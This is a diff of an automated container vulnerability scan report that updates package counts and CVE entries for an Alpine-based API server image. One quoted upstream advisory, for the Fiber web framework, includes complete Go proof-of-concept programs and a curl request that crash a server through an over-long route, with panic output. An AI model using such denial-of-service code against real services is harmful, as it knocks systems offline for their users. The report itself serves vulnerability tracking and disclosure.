@@ -3,10 +3,10 @@ hide_table_of_contents: true
 ---
 
 <table>
-<tr><td>digest</td><td><code>sha256:812f1f326bada73c3eaebb885af162e8252f5ac1485afb235ad47d8794bc62bb</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 5" src="https://img.shields.io/badge/high-5-e25d68"/> <img alt="medium: 16" src="https://img.shields.io/badge/medium-16-fbb552"/> <img alt="low: 8" src="https://img.shields.io/badge/low-8-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/unspecified-2-lightgrey"/></td></tr>
+<tr><td>digest</td><td><code>sha256:0860e27e41e98279cc8caba97b62b1b9847a314093d652ea5ffb1c14e387386c</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 6" src="https://img.shields.io/badge/high-6-e25d68"/> <img alt="medium: 18" src="https://img.shields.io/badge/medium-18-fbb552"/> <img alt="low: 5" src="https://img.shields.io/badge/low-5-fce1a9"/> <!-- unspecified: 0 --></td></tr>
 <tr><td>platform</td><td>linux/arm64</td></tr>
-<tr><td>size</td><td>48 MB</td></tr>
-<tr><td>packages</td><td>206</td></tr>
+<tr><td>size</td><td>65 MB</td></tr>
+<tr><td>packages</td><td>255</td></tr>
 </table>
 </details></table>
 </details>
@@ -18,7 +18,7 @@ hide_table_of_contents: true
 <small><code>pkg:apk/alpine/libssl3@3.3.5-r0?arch=aarch64&distro=alpine-3.20.8&upstream=openssl</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (24:24)
+# api-server.Dockerfile (29:29)
 FROM ${ALPINE_IMAGE}
 ```
 
@@ -201,8 +201,8 @@ FROM ${ALPINE_IMAGE}
 <small><code>pkg:apk/alpine/c-ares@1.33.1-r0?arch=aarch64&distro=alpine-3.20.8</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (25:25)
-RUN apk --no-cache add ca-certificates libssl3 git openssh-client
+# api-server.Dockerfile (30:30)
+RUN apk --no-cache add ca-certificates libssl3 git
 ```
 
 <br/>
@@ -243,13 +243,52 @@ RUN apk --no-cache add ca-certificates libssl3 git openssh-client
 </details></td></tr>
 
 <tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/sdk</strong> <code>1.34.0</code> (golang)</summary>
+
+<small><code>pkg:golang/go.opentelemetry.io/otel/sdk@1.34.0</code></small><br/>
+
+```dockerfile
+# api-server.Dockerfile (32:32)
+COPY --from=build /app /bin/app
+```
+
+<br/>
+
+<a href="https://scout.docker.com/v/CVE-2026-24051?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.21.0%2C%3C1.40.0"><img alt="high 7.0: CVE--2026--24051" src="https://img.shields.io/badge/CVE--2026--24051-lightgrey?label=high%207.0&labelColor=e25d68"/></a> <i>Untrusted Search Path</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.21.0<br/><1.40.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.40.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+The OpenTelemetry Go SDK in version `v1.20.0`-`1.39.0` is vulnerable to Path Hijacking (Untrusted Search Paths) on macOS/Darwin systems. The resource detection code in `sdk/resource/host_id.go` executes the `ioreg` system command using a search path. An attacker with the ability to locally modify the PATH environment variable can achieve Arbitrary Code Execution (ACE) within the context of the application.
+
+### Patches
+This has been patched in [d45961b](https://github.com/open-telemetry/opentelemetry-go/commit/d45961bcda453fcbdb6469c22d6e88a1f9970a53), which was released with `v1.40.0`.
+
+### References
+- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/docker/cli</strong> <code>27.1.1+incompatible</code> (golang)</summary>
 
 <small><code>pkg:golang/github.com/docker/cli@27.1.1%2Bincompatible</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (28:28)
-COPY --from=build /app/testworkflow-init /init
+# api-server.Dockerfile (32:32)
+COPY --from=build /app /bin/app
 ```
 
 <br/>
@@ -309,8 +348,8 @@ Nitesh Surana (niteshsurana.com) of Trend Research of TrendAI
 <small><code>pkg:apk/alpine/libcurl@8.14.1-r2?arch=aarch64&distro=alpine-3.20.8&upstream=curl</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (25:25)
-RUN apk --no-cache add ca-certificates libssl3 git openssh-client
+# api-server.Dockerfile (30:30)
+RUN apk --no-cache add ca-certificates libssl3 git
 ```
 
 <br/>
@@ -405,8 +444,8 @@ RUN apk --no-cache add ca-certificates libssl3 git openssh-client
 <table>
 <tr><td>Affected range</td><td><code>&lt;=8.14.1-r2</code></td></tr>
 <tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
-<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
 </table>
 
 <details><summary>Description</summary>
@@ -436,76 +475,12 @@ RUN apk --no-cache add ca-certificates libssl3 git openssh-client
 </details></td></tr>
 
 <tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>openssh-keygen</strong> <code>9.7_p1-r5</code> (apk)</summary>
-
-<small><code>pkg:apk/alpine/openssh-keygen@9.7_p1-r5?arch=aarch64&distro=alpine-3.20.8&upstream=openssh</code></small><br/>
-
-```dockerfile
-# tw-toolkit.Dockerfile (25:25)
-RUN apk --no-cache add ca-certificates libssl3 git openssh-client
-```
-
-<br/>
-
-<a href="https://scout.docker.com/v/CVE-2025-32728?s=alpine&n=openssh&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D9.7_p1-r5"><img alt="medium : CVE--2025--32728" src="https://img.shields.io/badge/CVE--2025--32728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
-
-<table>
-<tr><td>Affected range</td><td><code>&lt;=9.7_p1-r5</code></td></tr>
-<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
-<tr><td>EPSS Score</td><td><code>0.274%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-
-
-</blockquote>
-</details>
-
-<a href="https://scout.docker.com/v/CVE-2025-61985?s=alpine&n=openssh&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D9.7_p1-r5"><img alt="low : CVE--2025--61985" src="https://img.shields.io/badge/CVE--2025--61985-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
-
-<table>
-<tr><td>Affected range</td><td><code>&lt;=9.7_p1-r5</code></td></tr>
-<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
-<tr><td>EPSS Score</td><td><code>0.008%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-
-
-</blockquote>
-</details>
-
-<a href="https://scout.docker.com/v/CVE-2025-61984?s=alpine&n=openssh&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D9.7_p1-r5"><img alt="low : CVE--2025--61984" src="https://img.shields.io/badge/CVE--2025--61984-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
-
-<table>
-<tr><td>Affected range</td><td><code>&lt;=9.7_p1-r5</code></td></tr>
-<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
-<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>ssl_client</strong> <code>1.36.1-r30</code> (apk)</summary>
 
 <small><code>pkg:apk/alpine/ssl_client@1.36.1-r30?arch=aarch64&distro=alpine-3.20.8&upstream=busybox</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (24:24)
+# api-server.Dockerfile (29:29)
 FROM ${ALPINE_IMAGE}
 ```
 
@@ -569,8 +544,8 @@ FROM ${ALPINE_IMAGE}
 <small><code>pkg:apk/alpine/libexpat@2.7.3-r0?arch=aarch64&distro=alpine-3.20.8&upstream=expat</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (25:25)
-RUN apk --no-cache add ca-certificates libssl3 git openssh-client
+# api-server.Dockerfile (30:30)
+RUN apk --no-cache add ca-certificates libssl3 git
 ```
 
 <br/>
@@ -611,68 +586,382 @@ RUN apk --no-cache add ca-certificates libssl3 git openssh-client
 </details></td></tr>
 
 <tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>stdlib</strong> <code>1.25.7</code> (golang)</summary>
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/go-jose/go-jose</strong> <code>2.6.3+incompatible</code> (golang)</summary>
 
-<small><code>pkg:golang/stdlib@1.25.7</code></small><br/>
+<small><code>pkg:golang/github.com/go-jose/go-jose@2.6.3%2Bincompatible</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (28:28)
-COPY --from=build /app/testworkflow-init /init
+# api-server.Dockerfile (32:32)
+COPY --from=build /app /bin/app
 ```
 
 <br/>
 
-<a href="https://scout.docker.com/v/CVE-2026-27139?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="low : CVE--2026--27139" src="https://img.shields.io/badge/CVE--2026--27139-lightgrey?label=low%20&labelColor=fce1a9"/></a> 
+<a href="https://scout.docker.com/v/CVE-2025-27144?s=github&n=go-jose&ns=github.com%2Fgo-jose&t=golang&vr=%3C3.0.4"><img alt="medium 6.9: CVE--2025--27144" src="https://img.shields.io/badge/CVE--2025--27144-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>
 
 <table>
-<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;3.0.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.0.4</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
 </table>
 
 <details><summary>Description</summary>
 <blockquote>
 
-On Unix platforms, when listing the contents of a directory using File.ReadDir or File.Readdir the returned FileInfo could reference a file outside of the Root in which the File was opened.
+### Impact
+When parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, ".") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.
 
-The impact of this escape is limited to reading metadata provided by lstat from arbitrary locations on the filesystem without permitting reading or writing files outside the root.
+### Patches
+Version 4.0.5 fixes this issue
+
+### Workarounds
+Applications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.
+
+### References
+This is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.
 
 </blockquote>
 </details>
+</details></td></tr>
 
-<a href="https://scout.docker.com/v/CVE-2026-27142?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="unspecified : CVE--2026--27142" src="https://img.shields.io/badge/CVE--2026--27142-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/nats-server/v2</strong> <code>2.11.4</code> (golang)</summary>
+
+<small><code>pkg:golang/github.com/nats-io/nats-server/v2@2.11.4</code></small><br/>
+
+```dockerfile
+# api-server.Dockerfile (32:32)
+COPY --from=build /app /bin/app
+```
+
+<br/>
+
+<a href="https://scout.docker.com/v/CVE-2026-27571?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3C2.11.12"><img alt="medium 5.9: CVE--2026--27571" src="https://img.shields.io/badge/CVE--2026--27571-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>
 
 <table>
-<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;2.11.12</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.11.12</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.070%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
 </table>
 
 <details><summary>Description</summary>
 <blockquote>
 
-Actions which insert URLs into the content attribute of HTML meta tags are not escaped. This can allow XSS if the meta tag also has an http-equiv attribute with the value "refresh".
+### Impact
 
-A new GODEBUG setting has been added, htmlmetacontenturlescape, which can be used to disable escaping URLs in actions in the meta content attribute which follow "url=" by setting htmlmetacontenturlescape=0.
+The WebSockets handling of NATS messages handles compressed messages via the WebSockets negotiated compression.  The implementation bound the memory size of a NATS message but did not independently bound the memory consumption of the memory stream when constructing a NATS message which might then fail validation for size reasons.
+
+An attacker can use a compression bomb to cause excessive memory consumption, often resulting in the operating system terminating the server process.
+
+The use of compression is negotiated before authentication, so this does not require valid NATS credentials to exploit.
+
+The fix was to bounds the decompression to fail once the message was too large, instead of continuing on.
+
+### Patches
+
+This was released in nats-server without being highlighted as a security issue.  It should have been, this was an oversight.  Per the NATS security policy, because this does not require a valid user, it is CVE-worthy.
+
+This was fixed in the v2.11 series with v2.11.12 and in the v2.12 series with v2.12.3.
+
+### Workarounds
+
+This only affects deployments which use WebSockets and which expose the network port to untrusted end-points.
+
+### References
+
+This was reported to the NATS maintainers by Pavel Kohout of Aisle Research (www.aisle.com).
 
 </blockquote>
 </details>
+</details></td></tr>
 
-<a href="https://scout.docker.com/v/CVE-2026-25679?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="unspecified : CVE--2026--25679" src="https://img.shields.io/badge/CVE--2026--25679-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/gofiber/fiber/v2</strong> <code>2.52.11</code> (golang)</summary>
+
+<small><code>pkg:golang/github.com/gofiber/fiber/v2@2.52.11</code></small><br/>
+
+```dockerfile
+# api-server.Dockerfile (32:32)
+COPY --from=build /app /bin/app
+```
+
+<br/>
+
+<a href="https://scout.docker.com/v/CVE-2026-25882?s=github&n=v2&ns=github.com%2Fgofiber%2Ffiber&t=golang&vr=%3C2.52.12"><img alt="medium 6.9: CVE--2026--25882" src="https://img.shields.io/badge/CVE--2026--25882-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Validation of Array Index</i>
 
 <table>
-<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;2.52.12</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.52.12</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
 </table>
 
 <details><summary>Description</summary>
 <blockquote>
 
-url.Parse insufficiently validated the host/authority component and accepted some invalid URLs.
+A denial of service vulnerability exists in Fiber v2 and v3 that allows remote attackers to crash the application by sending requests to routes with more than 30 parameters. The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.
+
+## Affected Versions
+
+- **Fiber v3.0.0-rc.3** and earlier v3 releases
+- **Fiber v2.52.10** and potentially all v2 releases (confirmed exploitable)
+- Both versions share the same vulnerable routing implementation
+
+## Vulnerability Details
+
+### Root Cause
+
+Both Fiber v2 and v3 define a fixed-size parameter array in `ctx.go`:
+
+```go
+const maxParams = 30
+
+type DefaultCtx struct {
+    values [maxParams]string  // Fixed 30-element array
+    // ...
+}
+```
+
+The `router.go` `register()` function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in `path.go` performs an unbounded write:
+
+- **v3**: `path.go:514`
+- **v2**: `path.go:516`
+
+```go
+// path.go:514 - NO BOUNDS CHECKING
+params[paramsIterator] = path[:i]
+```
+
+When `paramsIterator >= 30`, this triggers:
+```
+panic: runtime error: index out of range [30] with length 30
+```
+
+### Attack Scenario
+
+1. Application registers route with >30 parameters (e.g., via code or dynamic routing):
+   ```go
+   app.Get("/api/:p1/:p2/:p3/.../p35", handler)
+   ```
+
+2. Attacker sends matching HTTP request:
+   ```bash
+   curl http://target/api/v1/v2/v3/.../v35
+   ```
+
+3. Server crashes during request processing with runtime panic
+
+## Proof of Concept
+
+### For Fiber v3
+
+```go
+package main
+
+import (
+	"fmt"
+	"net/http"
+	"time"
+	"github.com/gofiber/fiber/v3"
+)
+
+func main() {
+	app := fiber.New()
+	
+	// Register route with 35 parameters (exceeds maxParams=30)
+	path := "/test"
+	for i := 1; i <= 35; i++ {
+		path += fmt.Sprintf("/:p%d", i)
+	}
+	
+	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+	app.Get(path, func(c fiber.Ctx) error {
+		return c.SendString("Never reached")
+	})
+	fmt.Println("✓ Registration succeeded (NO PANIC)")
+	
+	go func() {
+		app.Listen(":9999")
+	}()
+	time.Sleep(200 * time.Millisecond)
+	
+	// Build exploit URL with 35 parameter values
+	url := "http://localhost:9999/test"
+	for i := 1; i <= 35; i++ {
+		url += fmt.Sprintf("/v%d", i)
+	}
+	
+	fmt.Println("\n🔴 Sending exploit request...")
+	fmt.Println("Expected: panic at path.go:514 params[paramsIterator] = path[:i]\n")
+	
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Printf("✗ Request failed: %v\n", err)
+		fmt.Println("💥 Server crashed!")
+	} else {
+		fmt.Printf("Response: %d\n", resp.StatusCode)
+		resp.Body.Close()
+	}
+}
+```
+
+**Output:**
+```
+Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:514 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v3.(*routeParser).getMatch(...)
+	/path/to/fiber/path.go:514
+github.com/gofiber/fiber/v3.(*Route).match(...)
+	/path/to/fiber/router.go:89
+github.com/gofiber/fiber/v3.(*App).next(...)
+	/path/to/fiber/router.go:142
+```
+
+### For Fiber v2
+
+```go
+package main
+
+import (
+	"fmt"
+	"net/http"
+	"time"
+	"github.com/gofiber/fiber/v2"
+)
+
+func main() {
+	app := fiber.New()
+	
+	// Register route with 35 parameters (exceeds maxParams=30)
+	path := "/test"
+	for i := 1; i <= 35; i++ {
+		path += fmt.Sprintf("/:p%d", i)
+	}
+	
+	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+	app.Get(path, func(c *fiber.Ctx) error {
+		return c.SendString("Never reached")
+	})
+	fmt.Println("✓ Registration succeeded (NO PANIC)")
+	
+	go func() {
+		app.Listen(":9998")
+	}()
+	time.Sleep(200 * time.Millisecond)
+	
+	// Build exploit URL with 35 parameter values
+	url := "http://localhost:9998/test"
+	for i := 1; i <= 35; i++ {
+		url += fmt.Sprintf("/v%d", i)
+	}
+	
+	fmt.Println("\n🔴 Sending exploit request...")
+	fmt.Println("Expected: panic at path.go:516 params[paramsIterator] = path[:i]\n")
+	
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Printf("✗ Request failed: %v\n", err)
+		fmt.Println("💥 Server crashed!")
+	} else {
+		fmt.Printf("Response: %d\n", resp.StatusCode)
+		resp.Body.Close()
+	}
+}
+```
+
+**Output (v2):**
+```
+Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:516 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v2.(*routeParser).getMatch(...)
+	/path/to/fiber/v2@v2.52.10/path.go:512
+github.com/gofiber/fiber/v2.(*Route).match(...)
+	/path/to/fiber/v2@v2.52.10/router.go:84
+github.com/gofiber/fiber/v2.(*App).next(...)
+	/path/to/fiber/v2@v2.52.10/router.go:127
+```
+
+## Impact
+
+### Exploitation Requirements
+- No authentication required
+- Single HTTP request triggers crash
+- Trivially scriptable for sustained DoS
+- Works against any route with >30 parameters
+
+### Real-World Impact
+- **Public APIs**: Remote DoS attacks on vulnerable endpoints
+- **Microservices**: Cascade failures if vulnerable service is critical
+- **Auto-scaling**: Repeated crashes prevent proper recovery
+- **Monitoring**: Log flooding and alert fatigue
+
+### Likelihood
+**HIGH** - Exploitation requires only:
+- Knowledge of route structure (often public in APIs)
+- Standard HTTP client (curl, browser, etc.)
+- Single malformed request
+
+## Workarounds
+
+Until patched, users should:
+
+1. **Audit Routes**: Ensure all routes have ≤30 parameters
+   ```bash
+   # Search for potential issues
+   grep -r "/:.*/:.*/:.*" . | grep -v node_modules
+   ```
+
+2. **Disable Dynamic Routing**: If programmatically registering routes, validate parameter count:
+   ```go
+   paramCount := strings.Count(route, ":")
+   if paramCount > 30 {
+       log.Fatal("Route exceeds maxParams")
+   }
+   ```
+
+3. **Rate Limiting**: Deploy aggressive rate limiting to mitigate DoS impact
+
+4. **Monitoring**: Alert on panic patterns in application logs
+
+## Timeline
+
+- **2024-12-24**: Vulnerability discovered in v3 during PR #3962 review
+- **2024-12-25**: Proof of concept confirmed exploitability in v3
+- **2024-12-25**: Vulnerability confirmed to also exist in v2 (same root cause)
+- **2024-12-25**: Security advisory created
+
+## References
+
+- **v3 Related PR**: https://github.com/gofiber/fiber/pull/3962 (UpdateParam feature with defensive checks, doesn't fix root cause)
+- **Vulnerable Code Locations**:
+  - v3: [path.go:514](https://github.com/gofiber/fiber/blob/main/path.go#L514)
+  - v2: [path.go:516](https://github.com/gofiber/fiber/blob/v2/path.go#L516)
+
+## Credit
+
+**Discovered by:** @sixcolors (Fiber maintainer) and @TheAspectDev
 
 </blockquote>
 </details>
@@ -684,7 +973,7 @@ url.Parse insufficiently validated the host/authority component and accepted som
 <small><code>pkg:apk/alpine/zlib@1.3.1-r1?arch=aarch64&distro=alpine-3.20.8</code></small><br/>
 
 ```dockerfile
-# tw-toolkit.Dockerfile (24:24)
+# api-server.Dockerfile (29:29)
 FROM ${ALPINE_IMAGE}
 ```
 
